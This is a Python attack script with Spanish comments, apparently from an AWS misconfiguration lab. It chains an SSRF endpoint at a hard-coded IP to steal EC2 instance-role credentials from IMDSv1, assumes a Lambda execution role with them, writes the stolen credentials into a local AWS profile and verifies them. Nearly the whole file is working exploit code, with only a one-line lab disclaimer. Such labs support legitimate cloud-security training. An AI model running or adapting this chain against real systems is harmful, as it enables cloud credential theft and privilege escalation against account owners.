#!/usr/bin/env python3
"""
refresh_creds.py
Automatiza: SSRF → robo de credenciales IMDSv1 → assume-role → actualiza perfil AWS

Uso:
    python3 refresh_creds.py
    python3 refresh_creds.py --ssrf-url http://13.218.182.76:8080/fetch --role corp-lambda-execution-role
"""

import argparse
import json
import subprocess
import sys
import urllib.request
from datetime import datetime, timezone


# ─── Configuración por defecto del lab ────────────────────────────────────────
DEFAULTS = {
    "ssrf_url"    : "http://13.218.182.76:8080/fetch",
    "imds_base"   : "http://169.254.169.254/latest/meta-data/iam/security-credentials",
    "ec2_role"    : "corp-ec2-instance-role",
    "lambda_role" : "arn:aws:iam::351668480234:role/corp-lambda-execution-role",
    "profile"     : "lambda-role",
    "region"      : "us-east-1",
    "session_name": "privesc-lambda",
}


def banner():
    print("""
\033[91m
  ██████╗ ███████╗███████╗██████╗ ███████╗███████╗██╗  ██╗
  ██╔══██╗██╔════╝██╔════╝██╔══██╗██╔════╝██╔════╝██║  ██║
  ██████╔╝█████╗  █████╗  ██████╔╝█████╗  ███████╗███████║
  ██╔══██╗██╔══╝  ██╔══╝  ██╔══██╗██╔══╝  ╚════██║██╔══██║
  ██║  ██║███████╗██║     ██║  ██║███████╗███████║██║  ██║
  ╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝
\033[0m
  \033[93maws-misconfig-lab\033[0m — SSRF → IMDS → Role Chain → Profile Update
  \033[90mSolo para uso en entornos de laboratorio controlados\033[0m
""")


def ssrf_fetch(ssrf_url: str, target_url: str) -> dict:
    """Usa el endpoint SSRF para hacer fetch de una URL interna."""
    full_url = f"{ssrf_url}?url={target_url}"
    print(f"  [*] SSRF fetch → {target_url}")
    try:
        with urllib.request.urlopen(full_url, timeout=10) as resp:
            data = json.loads(resp.read().decode())
            return data
    except Exception as e:
        print(f"  \033[91m[!] Error en SSRF fetch: {e}\033[0m")
        sys.exit(1)


def get_ec2_credentials(ssrf_url: str, imds_base: str, role_name: str) -> dict:
    """Roba credenciales temporales del EC2 role via SSRF → IMDSv1."""
    print(f"\n\033[94m[1] Robando credenciales de {role_name} via SSRF + IMDSv1...\033[0m")
    target = f"{imds_base}/{role_name}"
    creds = ssrf_fetch(ssrf_url, target)

    required = {"AccessKeyId", "SecretAccessKey", "Token", "Expiration"}
    if not required.issubset(creds.keys()):
        print(f"  \033[91m[!] Respuesta inesperada: {creds}\033[0m")
        sys.exit(1)

    expiry = creds["Expiration"]
    print(f"  \033[92m[+] Credenciales obtenidas\033[0m")
    print(f"      AccessKeyId : {creds['AccessKeyId']}")
    print(f"      Expiration  : {expiry}")
    return creds


def assume_role(ec2_creds: dict, role_arn: str, session_name: str, region: str) -> dict:
    """Asume el Lambda role usando las credenciales del EC2 role."""
    print(f"\n\033[94m[2] Asumiendo role {role_arn}...\033[0m")

    env = {
        "AWS_ACCESS_KEY_ID"    : ec2_creds["AccessKeyId"],
        "AWS_SECRET_ACCESS_KEY": ec2_creds["SecretAccessKey"],
        "AWS_SESSION_TOKEN"    : ec2_creds["Token"],
        "AWS_DEFAULT_REGION"   : region,
        "PATH"                 : "/usr/local/bin:/usr/bin:/bin",
    }

    cmd = [
        "aws", "sts", "assume-role",
        "--role-arn", role_arn,
        "--role-session-name", session_name,
        "--region", region,
        "--output", "json",
    ]

    result = subprocess.run(cmd, env=env, capture_output=True, text=True)

    if result.returncode != 0:
        print(f"  \033[91m[!] assume-role falló:\033[0m {result.stderr.strip()}")
        sys.exit(1)

    data = json.loads(result.stdout)
    creds = data["Credentials"]
    arn   = data["AssumedRoleUser"]["Arn"]

    print(f"  \033[92m[+] Role asumido exitosamente\033[0m")
    print(f"      ARN        : {arn}")
    print(f"      AccessKeyId: {creds['AccessKeyId']}")
    print(f"      Expiration : {creds['Expiration']}")
    return creds


def update_aws_profile(creds: dict, profile: str, region: str):
    """Actualiza el perfil en ~/.aws/credentials con las nuevas credenciales."""
    print(f"\n\033[94m[3] Actualizando perfil '{profile}' en ~/.aws/credentials...\033[0m")

    settings = {
        "aws_access_key_id"    : creds["AccessKeyId"],
        "aws_secret_access_key": creds["SecretAccessKey"],
        "aws_session_token"    : creds["SessionToken"],
        "region"               : region,
    }

    for key, value in settings.items():
        cmd = ["aws", "configure", "set", key, value, "--profile", profile]
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode != 0:
            print(f"  \033[91m[!] Error actualizando {key}: {result.stderr.strip()}\033[0m")
            sys.exit(1)

    print(f"  \033[92m[+] Perfil '{profile}' actualizado\033[0m")


def verify_profile(profile: str):
    """Verifica que el perfil funciona con get-caller-identity."""
    print(f"\n\033[94m[4] Verificando identidad con perfil '{profile}'...\033[0m")

    cmd = ["aws", "sts", "get-caller-identity", "--profile", profile, "--output", "json"]
    result = subprocess.run(cmd, capture_output=True, text=True)

    if result.returncode != 0:
        print(f"  \033[91m[!] Verificación falló: {result.stderr.strip()}\033[0m")
        sys.exit(1)

    identity = json.loads(result.stdout)
    print(f"  \033[92m[+] Identidad confirmada\033[0m")
    print(f"      UserId  : {identity['UserId']}")
    print(f"      Account : {identity['Account']}")
    print(f"      ARN     : {identity['Arn']}")


def parse_args():
    parser = argparse.ArgumentParser(
        description="SSRF → IMDSv1 → Role Chain → AWS Profile Update"
    )
    parser.add_argument("--ssrf-url",    default=DEFAULTS["ssrf_url"],
                        help=f"URL del endpoint SSRF vulnerable (default: {DEFAULTS['ssrf_url']})")
    parser.add_argument("--ec2-role",    default=DEFAULTS["ec2_role"],
                        help=f"Nombre del EC2 IAM role (default: {DEFAULTS['ec2_role']})")
    parser.add_argument("--role",        default=DEFAULTS["lambda_role"],
                        help=f"ARN del role a asumir (default: {DEFAULTS['lambda_role']})")
    parser.add_argument("--profile",     default=DEFAULTS["profile"],
                        help=f"Perfil AWS a actualizar (default: {DEFAULTS['profile']})")
    parser.add_argument("--region",      default=DEFAULTS["region"],
                        help=f"Region AWS (default: {DEFAULTS['region']})")
    parser.add_argument("--session",     default=DEFAULTS["session_name"],
                        help=f"Nombre de sesión para assume-role (default: {DEFAULTS['session_name']})")
    return parser.parse_args()


def main():
    banner()
    args = parse_args()

    print(f"\033[93m[~] Iniciando refresh de credenciales — {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')}\033[0m")

    # Paso 1 — Robar creds del EC2 role via SSRF
    ec2_creds = get_ec2_credentials(
        ssrf_url  = args.ssrf_url,
        imds_base = DEFAULTS["imds_base"],
        role_name = args.ec2_role,
    )

    # Paso 2 — Asumir el Lambda role
    lambda_creds = assume_role(
        ec2_creds    = ec2_creds,
        role_arn     = args.role,
        session_name = args.session,
        region       = args.region,
    )

    # Paso 3 — Actualizar perfil local
    update_aws_profile(
        creds   = lambda_creds,
        profile = args.profile,
        region  = args.region,
    )

    # Paso 4 — Verificar
    verify_profile(args.profile)

    print(f"\n\033[92m[✓] Credenciales refrescadas. Usa: --profile {args.profile}\033[0m\n")


if __name__ == "__main__":
    main()
